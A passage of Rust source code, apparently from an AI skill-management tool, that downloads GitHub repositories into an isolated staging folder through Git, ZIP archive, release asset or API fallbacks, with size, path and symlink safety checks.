        return Err(SOURCE_IMPORT_CANCELLED_MESSAGE.to_string());
    }

    let git_failure = match git_result {
        Ok(output) if output.status.success() => None,
        Ok(output) => {
            let stderr = compact_note(&String::from_utf8_lossy(&output.stderr));
            Some(if stderr.is_empty() {
                "系统 Git 返回失败，但没有提供错误详情。".to_string()
            } else {
                stderr.chars().take(320).collect()
            })
        }
        Err(message) => Some(message),
    };

    if let Some(git_failure) = git_failure {
        control.emit(
            "git",
            "fallback",
            "系统 Git 连接失败，正在切换到 GitHub ZIP 下载。",
            0,
            0,
        );
        if staged_path.exists() {
            fs::remove_dir_all(staged_path).map_err(|error| {
                format!(
                    "Cannot clear incomplete Git staging folder {}: {}",
                    staged_path.display(),
                    error
                )
            })?;
        }
        let (download_method, downloaded_ref, skipped_symlinks, fallback_error) =
            match stage_github_source_import_via_codeload_with_control(plan, staged_path, control) {
                Ok(download) => (
                    "github-codeload",
                    download.downloaded_ref,
                    download.skipped_symlinks,
                    None,
                ),
                Err(codeload_error) => {
                    if control.is_cancelled() || codeload_error == SOURCE_IMPORT_CANCELLED_MESSAGE {
                        let _ = cleanup_cancelled_source_import(staged_path);
                        control.emit("zip", "cancelled", SOURCE_IMPORT_CANCELLED_MESSAGE, 0, 0);
                        return Err(SOURCE_IMPORT_CANCELLED_MESSAGE.to_string());
                    }
                    if staged_path.exists() {
                        fs::remove_dir_all(staged_path).map_err(|error| {
                            format!(
                                "Cannot clear incomplete GitHub archive staging folder {}: {}",
                                staged_path.display(),
                                error
                            )
                        })?;
                    }
                    match stage_github_source_import_via_release_asset_with_control(
                        plan,
                        staged_path,
                        control,
                    ) {
                        Ok(download) => (
                            "github-release-skill",
                            download.downloaded_ref,
                            download.skipped_symlinks,
                            None,
                        ),
                        Err(release_error) => {
                            if control.is_cancelled()
                                || release_error == SOURCE_IMPORT_CANCELLED_MESSAGE
                            {
                                let _ = cleanup_cancelled_source_import(staged_path);
                                return Err(SOURCE_IMPORT_CANCELLED_MESSAGE.to_string());
                            }
                            if staged_path.exists() {
                                fs::remove_dir_all(staged_path).map_err(|error| {
                                    format!(
                                        "Cannot clear incomplete release staging folder {}: {}",
                                        staged_path.display(),
                                        error
                                    )
                                })?;
                            }
                            match stage_github_source_import_via_api(plan, staged_path) {
                                Ok(default_branch) => {
                                    ("github-api", default_branch, Vec::new(), None)
                                }
                                Err(api_error) => (
                                    "failed",
                                    String::new(),
                                    Vec::new(),
                                    Some(format!(
                                        "整仓归档：{}；Skill Release：{}；API 下载：{}",
                                        codeload_error, release_error, api_error
                                    )),
                                ),
                            }
                        }
                    }
                }
            };
        if let Some(fallback_error) = fallback_error {
            if staged_path.exists() {
                fs::remove_dir_all(staged_path).map_err(|_| {
                    "GitHub 下载失败，且隔离暂存目录未能自动清理；正式技能库没有改变，请在维护工具中重试清理。"
                        .to_string()
                })?;
            }
            execution.status = "blocked".to_string();
            execution.summary = "GitHub 来源下载失败；没有写入正式技能库。".to_string();
            execution.blocking_checks = vec![
                friendly_git_import_failure(&git_failure),
                format!("内置 GitHub 下载器：{}", fallback_error),
                "请检查网络/代理；私有仓库仍需要本机 Git 和相应凭据。".to_string(),
            ];
            execution.download_method = "failed".to_string();
            return Ok(());
        }
        execution.download_method = download_method.to_string();
        execution.blocking_checks = vec![
            format!(
                "系统 Git 不可用或克隆失败，已自动切换到内置 GitHub 下载器（引用：{}）。",
                downloaded_ref
            ),
            "内置下载器只保留可安装的 Skill 目录；若仓库没有 SKILL.md，则在文件数、单文件与总容量上限内保留完整 Prompt 项目工作区。"
                .to_string(),
        ];
        if !skipped_symlinks.is_empty() {
            execution.blocking_checks.push(format!(
                "安全提示：已跳过 {} 个符号链接别名（不创建、不跟随）：{}",
                skipped_symlinks.len(),
                skipped_symlinks
                    .iter()
                    .take(6)
                    .map(|path| compact_note(path))
                    .collect::<Vec<_>>()
                    .join("、")
            ));
        }
    } else {
        control.emit("git", "completed", "系统 Git 下载完成。", 1, 1);
        execution.download_method = "git".to_string();
        write_managed_source_metadata(staged_path, &plan.normalized_target, "git", "")?;
    }

    let (skill_count, prompt_count) = count_skill_dirs_in_path(staged_path)?;
    execution.status = if skill_count > 0 { "staged" } else { "warn" }.to_string();
    execution.summary = if skill_count > 0 {
        format!(
            "已下载 GitHub 来源：识别到 {} 个 Skill、{} 份 Prompt/说明文档。",
            skill_count, prompt_count
        )
    } else if prompt_count > 0 {
        format!(
            "该仓库没有可安装的 SKILL.md；已识别为 Prompt/资料来源（{} 份文档），不会伪装成 Skill。",
            prompt_count
        )
    } else {
        "该仓库没有发现可安装的 SKILL.md 或可用的 Prompt 文档。".to_string()
    };
    execution.skill_count = skill_count;
    execution.prompt_count = prompt_count;
    execution.copied_files = count_files_in_path(staged_path).unwrap_or(0);
    execution.copied_bytes = directory_size_bytes(staged_path).unwrap_or(0);
    if execution.blocking_checks.is_empty() {
        execution.blocking_checks = vec![
            "下载已在隔离目录完成，尚未覆盖任何现有来源。".to_string(),
            "确认内容后才会提升到受管理来源并刷新 AI 工具链接。".to_string(),
        ];
    }
    Ok(())
}

fn complete_sparse_skill_checkout(
    git_program: &str,
    staged_path: &Path,
    control: &SourceImportControl,
) -> Result<std::process::Output, String> {
    control.ensure_active()?;
    let mut tree_command = Command::new(git_program);
    tree_command.arg("-C").arg(staged_path).args([
        "-c",
        "core.quotepath=false",
        "ls-tree",
        "-r",
        "--name-only",
        "-z",
        "HEAD",
    ]);
    let tree_output = command_output_with_timeout_and_cancel(
        &mut tree_command,
        Duration::from_secs(45),
        "读取 GitHub 仓库目录超过 45 秒，已自动停止。",
        Some(control.cancelled.as_ref()),
    )?;
    if !tree_output.status.success() {
        return Ok(tree_output);
    }

    let paths = tree_output
        .stdout
        .split(|byte| *byte == 0)
        .filter_map(|path| std::str::from_utf8(path).ok())
        .filter(|path| !path.trim().is_empty())
        .collect::<Vec<_>>();
    let mut skill_roots = paths
        .iter()
        .filter(|path| {
            Path::new(path)
                .file_name()
                .and_then(|name| name.to_str())
                .map(|name| name.eq_ignore_ascii_case("SKILL.md"))
                .unwrap_or(false)
        })
        .filter_map(|path| Path::new(path).parent())
        .map(|path| path.to_string_lossy().replace('\\', "/"))
        .collect::<Vec<_>>();
    skill_roots.sort();
    skill_roots.dedup();

    let root_skill = skill_roots.iter().any(|root| root.is_empty());
    if !root_skill {
        let mut sparse_command = Command::new(git_program);
        configure_safe_git_materialization(&mut sparse_command, staged_path);
        if skill_roots.is_empty() {
            // Prompt repositories are not installed as Skills, but their instructions may
            // depend on project files such as train.py or prepare.py. Disable sparse mode so
            // the isolated, bounded source workspace remains runnable and inspectable.
            // Validate the committed tree before materializing any blob: a post-check alone
            // cannot prevent a hostile upstream from exhausting disk during checkout.
            validate_prompt_git_tree_before_checkout(git_program, staged_path, control)?;
            sparse_command.args(["sparse-checkout", "disable"]);
        } else {
            sparse_command.args(["sparse-checkout", "set", "--cone", "--"]);
            for root in &skill_roots {
                sparse_command.arg(root);
            }
        }
        let output = command_output_with_timeout_and_cancel(
            &mut sparse_command,
            Duration::from_secs(180),
            "Skill 文件下载超过 180 秒，已自动停止。请检查网络后重试。",
            Some(control.cancelled.as_ref()),
        )?;
        if !output.status.success() {
            return Ok(output);
        }
    }

    control.ensure_active()?;
    control.emit("git", "progress", "正在完成 Skill 文件校验。", 2, 3);
    let mut checkout_command = Command::new(git_program);
    configure_safe_git_materialization(&mut checkout_command, staged_path);
    checkout_command.args(["checkout", "--force", "HEAD"]);
    let checkout_output = command_output_with_timeout_and_cancel(
        &mut checkout_command,
        Duration::from_secs(180),
        "Skill 文件检出超过 180 秒，已自动停止。请检查网络后重试。",
        Some(control.cancelled.as_ref()),
    )?;
    if checkout_output.status.success() {
        validate_staged_repository_bounds(staged_path)?;
    }
    Ok(checkout_output)
}

fn configure_safe_git_materialization(command: &mut Command, staged_path: &Path) {
    let empty_global_config = if cfg!(windows) { "NUL" } else { "/dev/null" };
    command
        // Never let a repository's .gitattributes turn a bounded Git blob into
        // an unbounded LFS download or invoke a machine-global smudge filter.
        .env("GIT_LFS_SKIP_SMUDGE", "1")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", empty_global_config)
        .arg("-C")
        .arg(staged_path)
        .args(["-c", "filter.lfs.smudge="])
        .args(["-c", "filter.lfs.required=false"])
        .args(["-c", "core.hooksPath=.git/skillhub-disabled-hooks"]);
}

fn validate_prompt_git_tree_before_checkout(
    git_program: &str,
    staged_path: &Path,
    control: &SourceImportControl,
) -> Result<(), String> {
    control.ensure_active()?;
    let mut tree_command = Command::new(git_program);
    tree_command.arg("-C").arg(staged_path).args([
        "-c",
        "core.quotepath=false",
        "ls-tree",
        "-rlz",
        "HEAD",
    ]);
    let output = command_output_with_timeout_and_cancel(
        &mut tree_command,
        Duration::from_secs(45),
        "Prompt 仓库大小预检超过 45 秒，已自动停止。",
        Some(control.cancelled.as_ref()),
    )?;
    if !output.status.success() {
        let detail = compact_note(&String::from_utf8_lossy(&output.stderr));
        return Err(if detail.is_empty() {
            "无法在下载 Prompt 文件前读取 Git tree 大小。".to_string()
        } else {
            format!("无法在下载 Prompt 文件前读取 Git tree 大小：{detail}")
        });
    }

    let mut file_count = 0usize;
    let mut byte_count = 0u64;
    for raw_entry in output.stdout.split(|byte| *byte == 0) {
        if raw_entry.is_empty() {
            continue;
        }
        let entry = std::str::from_utf8(raw_entry)
            .map_err(|_| "Prompt Git tree 含不可解析的文件路径，已停止下载。".to_string())?;
        let (metadata, path) = entry
            .split_once('\t')
            .ok_or_else(|| "Prompt Git tree 响应格式异常，已停止下载。".to_string())?;
        let fields = metadata.split_whitespace().collect::<Vec<_>>();
        if fields.len() < 4 || fields[1] != "blob" {
            continue;
        }
        let relative = safe_relative_github_path(path)
            .ok_or_else(|| format!("Prompt Git tree 含不安全路径：{}", compact_note(path)))?;
        if relative.components().count() > 11 {
            return Err(format!(
                "Prompt Git tree 目录深度超过安全上限（10 层）：{}",
                relative.display()
            ));
        }
        if fields[0] == "120000" {
            // Symlink blobs carry only link metadata. Later traversal uses
            // symlink_metadata and never follows them outside staging.
            continue;
        }
        let size = fields[3].parse::<u64>().map_err(|_| {
            format!(
                "Prompt Git tree 未提供可验证的文件大小：{}",
                relative.display()
            )
        })?;
        if size > GITHUB_FALLBACK_MAX_FILE_BYTES {
            return Err(format!(
                "Prompt Git tree 包含超过 16 MB 的单个文件：{}",
                relative.display()
            ));
        }
        file_count += 1;
        byte_count = byte_count.saturating_add(size);
        if file_count > GITHUB_FALLBACK_MAX_FILES {
            return Err(format!(
                "Prompt Git tree 文件数超过安全上限（{} > {}）。",
                file_count, GITHUB_FALLBACK_MAX_FILES
            ));
        }
        if byte_count > GITHUB_FALLBACK_MAX_BYTES {
            return Err(format!(
                "Prompt Git tree 超过 80 MB 安全上限（{} bytes）。",
                byte_count
            ));
        }
    }
    Ok(())
}

fn validate_staged_repository_bounds(staged_path: &Path) -> Result<(), String> {
    let mut stack = vec![(staged_path.to_path_buf(), 0usize)];
    let mut file_count = 0usize;
    let mut byte_count = 0u64;
    while let Some((directory, depth)) = stack.pop() {
        if depth > 10 {
            return Err(format!(
                "Git 隔离工作区目录深度超过安全上限（10 层）：{}",
                directory.display()
            ));
        }
        let entries = fs::read_dir(&directory).map_err(|error| {
            format!("无法检查 Git 隔离工作区 {}：{}", directory.display(), error)
        })?;
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if file_type.is_symlink() {
                continue;
            }
            if file_type.is_dir() {
                // The checkout already consumed disk space. Count every tracked directory,
                // including node_modules/target/build, and exclude only Git's own metadata.
                if !name.eq_ignore_ascii_case(".git") {
                    stack.push((path, depth + 1));
                }
                continue;
            }
            if !file_type.is_file() {
                continue;
            }
            let size = entry
                .metadata()
                .map(|metadata| metadata.len())
                .unwrap_or_default();
            if size > GITHUB_FALLBACK_MAX_FILE_BYTES {
                return Err(format!(
                    "Git 隔离工作区包含超过 16 MB 的单个文件：{}",
                    path.display()
                ));
            }
            file_count += 1;
            byte_count = byte_count.saturating_add(size);
            if file_count > GITHUB_FALLBACK_MAX_FILES {
                return Err(format!(
                    "Git 隔离工作区文件数超过安全上限（{} > {}）。",
                    file_count, GITHUB_FALLBACK_MAX_FILES
                ));
            }
            if byte_count > GITHUB_FALLBACK_MAX_BYTES {
                return Err(format!(
                    "Git 隔离工作区超过 80 MB 安全上限（{} bytes）。",
                    byte_count
                ));
            }
        }
    }
    Ok(())
}

fn stage_github_source_import_via_api(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
) -> Result<String, String> {
    ensure_github_api_file_fallback_allowed(github_api_token().is_some())?;
    let (owner, repo) = parse_github_repo(&plan.normalized_target)
        .ok_or_else(|| "GitHub 地址无法解析。".to_string())?;
    let agent = github_http_agent();
    let repo_url = format!("https://api.github.com/repos/{}/{}", owner, repo);
    let repo_payload = github_json_request(&agent, &repo_url, &owner, &repo)?;
    let default_branch = repo_payload
        .get("default_branch")
        .and_then(Value::as_str)
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("main")
        .to_string();
    let tree_url = format!(
        "https://api.github.com/repos/{}/{}/git/trees/{}?recursive=1",
        owner,
        repo,
        percent_encode_url_component(&default_branch)
    );
    let tree_payload = github_json_request(&agent, &tree_url, &owner, &repo)?;
    if tree_payload
        .get("truncated")
        .and_then(Value::as_bool)
        .unwrap_or(false)
    {
        return Err("仓库文件树过大，GitHub API 返回了截断结果；请安装 Git 后重试。".to_string());
    }
    let selected_files = select_github_repository_files(&tree_payload)?;
    if selected_files.is_empty() {
        return Err("仓库没有可安全下载的文件。".to_string());
    }
    let planned_bytes = selected_files
        .iter()
        .fold(0u64, |total, file| total.saturating_add(file.size));
    if selected_files.len() > GITHUB_FALLBACK_MAX_FILES {
        return Err(format!(
            "需要下载的文件超过安全上限（{} > {}）。",
            selected_files.len(),
            GITHUB_FALLBACK_MAX_FILES
        ));
    }
    if planned_bytes > GITHUB_FALLBACK_MAX_BYTES {
        return Err(format!(
            "需要下载的文件超过 80 MB 安全上限（{} bytes）。",
            planned_bytes
        ));
    }

    fs::create_dir_all(staged_path).map_err(|error| {
        format!(
            "Cannot create GitHub API staging folder {}: {}",
            staged_path.display(),
            error
        )
    })?;
    let mut downloaded_bytes = 0u64;
    for file in selected_files {
        let relative_path = safe_relative_github_path(&file.path)
            .ok_or_else(|| format!("GitHub 返回了不安全路径：{}", compact_note(&file.path)))?;
        let output_path = staged_path.join(&relative_path);
        if !output_path.starts_with(staged_path) {
            return Err(format!("下载路径越过隔离目录：{}", relative_path.display()));
        }
        if let Some(parent) = output_path.parent() {
            fs::create_dir_all(parent).map_err(|error| {
                format!(
                    "Cannot create GitHub staging directory {}: {}",
                    parent.display(),
                    error
                )
            })?;
        }
        if file.api_url.trim().is_empty() {
            return Err(format!(
                "GitHub 文件缺少 Blob 地址：{}",
                compact_note(&file.path)
            ));
        }
        let expected_blob_prefix =
            format!("https://api.github.com/repos/{}/{}/git/blobs/", owner, repo);
        if !file
            .api_url
            .to_ascii_lowercase()
            .starts_with(&expected_blob_prefix.to_ascii_lowercase())
        {
            return Err(format!(
                "GitHub 返回了非预期的 Blob 地址：{}",
                compact_note(&file.path)
            ));
        }
        let blob = github_json_request(&agent, &file.api_url, &owner, &repo)
            .map_err(|error| format!("下载 {} 失败：{}", compact_note(&file.path), error))?;
        if blob.get("encoding").and_then(Value::as_str) != Some("base64") {
            return Err(format!(
                "GitHub 文件编码不受支持：{}",
                compact_note(&file.path)
            ));
        }
        let encoded = blob
            .get("content")
            .and_then(Value::as_str)
            .ok_or_else(|| format!("GitHub 文件内容为空：{}", compact_note(&file.path)))?
            .chars()
            .filter(|character| !character.is_whitespace())
            .collect::<String>();
        let bytes = BASE64_STANDARD.decode(encoded).map_err(|error| {
            format!(
                "GitHub 文件解码失败 {}：{}",
                compact_note(&file.path),
                error
            )
        })?;
        if bytes.len() as u64 > GITHUB_FALLBACK_MAX_FILE_BYTES {
            return Err(format!(
                "单个文件超过 16 MB 安全上限：{}",
                compact_note(&file.path)
            ));
        }
        downloaded_bytes = downloaded_bytes.saturating_add(bytes.len() as u64);
        if downloaded_bytes > GITHUB_FALLBACK_MAX_BYTES {
            return Err("下载内容超过 80 MB 安全上限。".to_string());
        }
        fs::write(&output_path, bytes).map_err(|error| {
            format!(
                "Cannot write GitHub staging file {}: {}",
                output_path.display(),
                error
            )
        })?;
    }
    write_managed_source_metadata(
        staged_path,
        &plan.normalized_target,
        "github-api",
        &default_branch,
    )?;
    Ok(default_branch)
}

fn ensure_github_api_file_fallback_allowed(has_token: bool) -> Result<(), String> {
    if has_token {
        return Ok(());
    }
    Err(
        "已停止匿名 GitHub API 逐文件回退：匿名额度每小时仅 60 次，无法可靠下载多文件仓库。请等待系统 Git/ZIP 网络恢复；私有仓库可在系统中配置 GITHUB_TOKEN 或 GH_TOKEN 后重试。"
            .to_string(),
    )
}

fn friendly_git_import_failure(raw: &str) -> String {
    let normalized = raw.to_ascii_lowercase();
    if normalized.contains("could not connect")
        || normalized.contains("failed to connect")
        || normalized.contains("timed out")
        || normalized.contains("recv failure")
        || normalized.contains("connection was reset")
    {
        "系统 Git 无法连接 GitHub；已自动尝试内置 ZIP 下载。请检查网络、代理或防火墙后重试。"
            .to_string()
    } else if normalized.contains("repository not found")
        || normalized.contains("authentication failed")
        || normalized.contains("permission denied")
    {
        "系统 Git 无法访问该仓库；请确认地址、仓库可见性和本机 Git 凭据。".to_string()
    } else {
        "系统 Git 克隆未完成；已自动尝试内置 ZIP 下载。".to_string()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct GithubCodeloadResult {
    downloaded_ref: String,
    skipped_symlinks: Vec<String>,
}

fn stage_github_source_import_via_release_asset_with_control(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    control: &SourceImportControl,
) -> Result<GithubCodeloadResult, String> {
    control.ensure_active()?;
    let (owner, repo) = parse_github_repo(&plan.normalized_target)
        .ok_or_else(|| "GitHub 地址无法解析。".to_string())?;
    control.emit(
        "zip",
        "fallback",
        "整仓过大或下载失败，正在查找作者发布的 Skill 专用包。",
        0,
        0,
    );
    let agent = github_http_agent();
    let release_url = format!(
        "https://api.github.com/repos/{}/{}/releases/latest",
        owner, repo
    );
    let release = github_json_request(&agent, &release_url, &owner, &repo)?;
    let tag = release
        .get("tag_name")
        .and_then(Value::as_str)
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("latest")
        .to_string();
    let expected_prefix = format!(
        "https://github.com/{}/{}/releases/download/",
        owner.to_ascii_lowercase(),
        repo.to_ascii_lowercase()
    );
    let asset = release
        .get("assets")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(|asset| {
            let name = asset.get("name")?.as_str()?.to_string();
            let normalized_name = name.to_ascii_lowercase();
            if !normalized_name.ends_with(".zip") || !normalized_name.contains("skill") {
                return None;
            }
            let size = asset.get("size")?.as_u64()?;
            let url = asset.get("browser_download_url")?.as_str()?.to_string();
            if size == 0
                || size > GITHUB_FALLBACK_MAX_BYTES
                || !url.to_ascii_lowercase().starts_with(&expected_prefix)
            {
                return None;
            }
            Some((name, size, url))
        })
        .min_by_key(|(_, size, _)| *size)
        .ok_or_else(|| {
            "最新 Release 没有找到名称含 skill、格式为 ZIP 且不超过 80 MB 的正式资产。".to_string()
        })?;

    control.emit(
        "zip",
        "started",
        format!("正在下载作者发布的 Skill 包：{}。", compact_note(&asset.0)),
        0,
        asset.1,
    );
    let request = agent
        .get(&asset.2)
        .set("User-Agent", "AI-SkillHub")
        .set("Accept", "application/zip");
    let response = request.call().map_err(|error| {
        format!(
            "Skill Release 下载失败 {}：{}",
            compact_note(&asset.0),
            github_download_error_message(error)
        )
    })?;
    let mut bytes = Vec::new();
    let mut reader = response.into_reader().take(GITHUB_FALLBACK_MAX_BYTES + 1);
    let mut buffer = [0u8; 64 * 1024];
    loop {
        control.ensure_active()?;
        let read = reader
            .read(&mut buffer)
            .map_err(|error| format!("Skill Release 下载中断：{error}"))?;
        if read == 0 {
            break;
        }
        bytes.extend_from_slice(&buffer[..read]);
        if bytes.len() as u64 > GITHUB_FALLBACK_MAX_BYTES {
            return Err("Skill Release 超过 80 MB 安全上限。".to_string());
        }
        control.emit(
            "zip",
            "progress",
            "正在下载作者发布的 Skill 专用包。",
            bytes.len() as u64,
            asset.1,
        );
    }

    let archive_path =
        staged_path.with_extension(format!("skillhub-release-{}.zip", unix_timestamp_string()));
    if let Some(parent) = archive_path.parent() {
        fs::create_dir_all(parent)
            .map_err(|error| format!("Cannot create release staging directory: {error}"))?;
    }
    fs::write(&archive_path, &bytes)
        .map_err(|error| format!("Cannot write temporary Skill Release archive: {error}"))?;
    let extraction = (|| {
        let inspection = inspect_package_archive(&archive_path)?;
        if !inspection.safe_to_extract || inspection.skill_count == 0 {
            return Err(if inspection.blocking_checks.is_empty() {
                "Skill Release 中没有发现 SKILL.md。".to_string()
            } else {
                inspection.blocking_checks.join("；")
            });
        }
        control.ensure_active()?;
        extract_package_archive_filtered(&archive_path, staged_path)?;
        write_managed_source_metadata(
            staged_path,
            &plan.normalized_target,
            "github-release-skill",
            &tag,
        )?;
        Ok(())
    })();
    let _ = fs::remove_file(&archive_path);
    if let Err(error) = extraction {
        if staged_path.exists() {
            let _ = fs::remove_dir_all(staged_path);
        }
        return Err(error);
    }
    control.emit(
        "write",
        "completed",
        "作者发布的 Skill 专用包已写入隔离区。",
        1,
        1,
    );
    Ok(GithubCodeloadResult {
        downloaded_ref: tag,
        skipped_symlinks: Vec::new(),
    })
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum CodeloadEntryInspection {
    File(PathBuf),
    Skip,
    SkipSymlink(String),
}

fn inspect_codeload_archive_entry(
    entry: &zip::read::ZipFile<'_>,
) -> Result<CodeloadEntryInspection, String> {
    if archive_entry_is_symlink(entry) {
        return Ok(CodeloadEntryInspection::SkipSymlink(compact_note(
            entry.name(),
        )));
    }
    if !entry.is_file() {
        return Ok(CodeloadEntryInspection::Skip);
    }
    let archive_path = safe_archive_entry_path(entry)
        .ok_or_else(|| format!("GitHub 归档含不安全路径：{}", compact_note(entry.name())))?;
    let relative_path = strip_codeload_root(&archive_path)
        .ok_or_else(|| format!("GitHub 归档缺少标准根目录：{}", compact_note(entry.name())))?;
    if archive_entry_should_skip(&relative_path) {
        return Ok(CodeloadEntryInspection::Skip);
    }
    Ok(CodeloadEntryInspection::File(relative_path))
}

#[cfg(test)]
fn stage_github_source_import_via_codeload(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
) -> Result<String, String> {
    let control = SourceImportControl::detached("source-import-codeload-test");
    stage_github_source_import_via_codeload_with_control(plan, staged_path, &control)
        .map(|result| result.downloaded_ref)
}

fn stage_github_source_import_via_codeload_with_control(
    plan: &SourceImportPlanCard,
    staged_path: &Path,
    control: &SourceImportControl,
) -> Result<GithubCodeloadResult, String> {
    control.ensure_active()?;
    let (owner, repo) = parse_github_repo(&plan.normalized_target)
        .ok_or_else(|| "GitHub 地址无法解析。".to_string())?;
    let url = format!("https://codeload.github.com/{}/{}/zip/HEAD", owner, repo);
    control.emit("zip", "started", "正在下载 GitHub ZIP 归档。", 0, 0);
    let agent = github_http_agent();
    let response = agent
        .get(&url)
        .set("User-Agent", "AI-SkillHub")
        .set("Accept", "application/zip")
        .call()
        .map_err(|error| {
            format!(
                "GitHub 归档请求失败 {}：{}",
                compact_note(&format!("{owner}/{repo}")),
                github_download_error_message(error)
            )
        })?;
    let expected_bytes = response
        .header("Content-Length")
        .and_then(|value| value.parse::<u64>().ok());
    if let Some(content_length) = expected_bytes {
        if content_length > GITHUB_FALLBACK_MAX_BYTES {
            return Err(format!(
                "仓库归档超过 80 MB 安全上限（{} bytes）。",
                content_length
            ));
        }
    }

    let mut archive_bytes = Vec::new();
    let mut reader = response.into_reader().take(GITHUB_FALLBACK_MAX_BYTES + 1);
    let mut buffer = [0u8; 64 * 1024];
    loop {
        control.ensure_active()?;
        let read = reader
            .read(&mut buffer)
            .map_err(|error| format!("GitHub 归档下载失败：{}", error))?;
        if read == 0 {
            break;
        }
        archive_bytes.extend_from_slice(&buffer[..read]);
        control.emit(
            "zip",
            "progress",
            "正在下载 GitHub ZIP 归档。",
            archive_bytes.len() as u64,
            expected_bytes.unwrap_or(0),
        );
    }
    if archive_bytes.len() as u64 > GITHUB_FALLBACK_MAX_BYTES {
        return Err("仓库归档超过 80 MB 安全上限。".to_string());
    }

    control.emit(
        "zip",
        "completed",
        "GitHub ZIP 归档下载完成。",
        archive_bytes.len() as u64,
        archive_bytes.len() as u64,
    );
    control.emit("inspect", "started", "正在检查归档路径与安全边界。", 0, 0);
    let cursor = std::io::Cursor::new(archive_bytes);
    let mut archive =
        ZipArchive::new(cursor).map_err(|error| format!("GitHub 归档无法读取：{}", error))?;
    if archive.is_empty() {
        return Err("GitHub 仓库归档为空。".to_string());
    }
    if archive.len() > 10_000 {
        return Err(format!(
            "仓库归档条目超过安全上限（{} > 10000）。",
            archive.len()
        ));
    }

    #[derive(Clone)]
    struct CodeloadFile {
        index: usize,
        path: PathBuf,
        size: u64,
    }

    let mut files = Vec::new();
    let mut skill_roots = HashSet::new();
    let mut skipped_symlinks = Vec::new();
    for index in 0..archive.len() {
        control.ensure_active()?;
        let entry = archive
            .by_index(index)
            .map_err(|error| format!("Cannot inspect GitHub archive entry {}: {}", index, error))?;
        let relative_path = match inspect_codeload_archive_entry(&entry)? {
            CodeloadEntryInspection::File(path) => path,
            CodeloadEntryInspection::Skip => continue,
            CodeloadEntryInspection::SkipSymlink(path) => {
                skipped_symlinks.push(path);
                continue;
            }
        };
        if entry.size() > GITHUB_FALLBACK_MAX_FILE_BYTES {
            return Err(format!(
                "单个文件超过 16 MB 安全上限：{}",
                relative_path.display()
            ));
        }
        if relative_path
            .file_name()
            .and_then(|name| name.to_str())
            .map(|name| name.eq_ignore_ascii_case("SKILL.md"))
            .unwrap_or(false)
        {
            skill_roots.insert(
                relative_path
                    .parent()
                    .unwrap_or_else(|| Path::new(""))
                    .to_path_buf(),
            );
        }
        files.push(CodeloadFile {
            index,
            path: relative_path,
            size: entry.size(),
        });
    }

    let mut selected = if skill_roots.is_empty() {
        files
    } else {
        files
            .into_iter()
            .filter(|file| {
                skill_roots
                    .iter()
                    .any(|root| root.as_os_str().is_empty() || file.path.starts_with(root))
            })
            .collect::<Vec<_>>()
    };
    selected.sort_by(|left, right| left.path.cmp(&right.path));
    selected.dedup_by(|left, right| left.path == right.path);
    if selected.is_empty() {
        return Err("仓库没有可安全解压的文件。".to_string());
    }
    if selected.len() > GITHUB_FALLBACK_MAX_FILES {
        return Err(format!(
            "需要下载的文件超过安全上限（{} > {}）。",
            selected.len(),
            GITHUB_FALLBACK_MAX_FILES
        ));
    }
    let planned_bytes = selected
        .iter()
        .fold(0u64, |total, file| total.saturating_add(file.size));
    if planned_bytes > GITHUB_FALLBACK_MAX_BYTES {
        return Err(format!(
            "需要解压的文件超过 80 MB 安全上限（{} bytes）。",
            planned_bytes
        ));
    }
    control.emit(
        "inspect",
        "completed",
        format!(
            "归档检查完成：将写入 {} 个文件，跳过 {} 个符号链接。",
            selected.len(),
            skipped_symlinks.len()
        ),
        selected.len() as u64,
        selected.len() as u64,
    );

    fs::create_dir_all(staged_path).map_err(|error| {
        format!(
            "Cannot create GitHub archive staging folder {}: {}",
            staged_path.display(),
            error
        )
    })?;
    let mut extracted_bytes = 0u64;
    let selected_count = selected.len() as u64;
    control.emit("write", "started", "正在写入隔离区。", 0, selected_count);
    for (selected_index, selected_file) in selected.into_iter().enumerate() {
        control.ensure_active()?;
        let mut entry = archive.by_index(selected_file.index).map_err(|error| {
            format!(
                "Cannot read GitHub archive entry {}: {}",
                selected_file.index, error
            )
        })?;
        let output_path = staged_path.join(&selected_file.path);
        if !output_path.starts_with(staged_path) {
            return Err(format!(
                "归档路径越过隔离目录：{}",
                selected_file.path.display()
            ));
        }
        if let Some(parent) = output_path.parent() {
            fs::create_dir_all(parent).map_err(|error| {
                format!(
                    "Cannot create GitHub archive staging directory {}: {}",
                    parent.display(),
                    error
                )
            })?;
        }
        let mut contents = Vec::new();
        entry
            .by_ref()
            .take(GITHUB_FALLBACK_MAX_FILE_BYTES + 1)
            .read_to_end(&mut contents)
            .map_err(|error| {
                format!(
                    "Cannot extract GitHub archive file {}: {}",
                    selected_file.path.display(),
                    error
                )
            })?;
        if contents.len() as u64 > GITHUB_FALLBACK_MAX_FILE_BYTES {
            return Err(format!(
                "解压后单个文件超过 16 MB 安全上限：{}",
                selected_file.path.display()
            ));
        }
        extracted_bytes = extracted_bytes.saturating_add(contents.len() as u64);
        if extracted_bytes > GITHUB_FALLBACK_MAX_BYTES {
            return Err("解压内容超过 80 MB 安全上限。".to_string());
        }
        fs::write(&output_path, contents).map_err(|error| {
            format!(
                "Cannot write GitHub archive staging file {}: {}",
                output_path.display(),
                error
            )
        })?;
        let completed = selected_index as u64 + 1;
        if completed == selected_count || completed.is_multiple_of(25) {
            control.emit(
                "write",
                "progress",
                "正在写入隔离区。",
                completed,
                selected_count,
            );
        }
    }
    write_managed_source_metadata(
        staged_path,
        &plan.normalized_target,
        "github-codeload",
        "HEAD",
    )?;
    control.emit(
        "write",
        "completed",
        "GitHub 来源已写入隔离区。",
        selected_count,
        selected_count,
    );
    Ok(GithubCodeloadResult {
        downloaded_ref: "HEAD".to_string(),
        skipped_symlinks,
    })
}

fn strip_codeload_root(path: &Path) -> Option<PathBuf> {
    let mut components = path.components();
    match components.next()? {
        Component::Normal(_) => {}
        _ => return None,
    }
    let relative = components.collect::<PathBuf>();
